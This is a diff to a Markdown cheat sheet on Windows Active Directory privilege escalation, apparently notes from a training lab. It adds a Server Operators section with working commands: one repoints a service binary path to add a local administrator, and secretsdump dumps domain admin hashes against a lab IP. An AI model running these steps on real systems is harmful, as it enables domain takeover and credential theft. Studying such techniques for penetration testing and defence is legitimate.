@@ -257,7 +257,7 @@ Get-ADGroupMember -Identity DnsAdmins
 - ServerLevelPluginDll allows us to load a custom DLL with zero verification of the DLL's path. This can be done with the dnscmd tool from the command line
 - When a member of the DnsAdmins group runs the dnscmd command below, the `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll` registry key is populated
 - When the DNS service is restarted, the DLL in this path will be loaded (i.e., a network share that the Domain Controller's machine account can access)
-- An attacker can load a custom DLL in context of `system/nt` in DC to obtain a reverse shell or even load a tool such as Mimikatz as a DLL to dump credentials.
+- An attacker can load a custom DLL in context of `NT AUTHORITY\SYSTEM` in DC to obtain a reverse shell or even load a tool such as Mimikatz as a DLL to dump credentials.
 
 ```powershell
 # 1) Generating Malicious DLL , from linux 
@@ -382,3 +382,40 @@ static bool LaunchShell()
 
 .\ExploitCapcom.exe
 ```
+
+## Server Operators
+- The Server Operators group allows members to administer Windows servers without needing assignment of Domain Admin privileges.
+- It is a very highly privileged group that can log in locally to servers, including Domain Controllers.
+- Membership of this group confers the powerful `SeBackupPrivilege` and `SeRestorePrivilege` privileges and the ability to control local services.
+- we can write a service bin path to exec code in context of `NT AUTHORITY\SYSTEM` in DC
+
+
+### check
+```powershell
+
+# check service ex: AppReadiness run in which context
+sc.exe qc AppReadiness
+
+# Checking Service Permissions
+PsService.exe security AppReadiness
+sc.exe sdshow AppReadiness
+```
+
+### RCE
+```powershell
+# Modifying the Service Binary Path
+sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
+
+# start the service , it will fail do not worry about that it is normal
+sc start AppReadiness
+
+# Confirming Local Admin Group Membership
+net localgroup Administrators
+
+# from linux 
+crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'
+secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator
+```
+
+
+
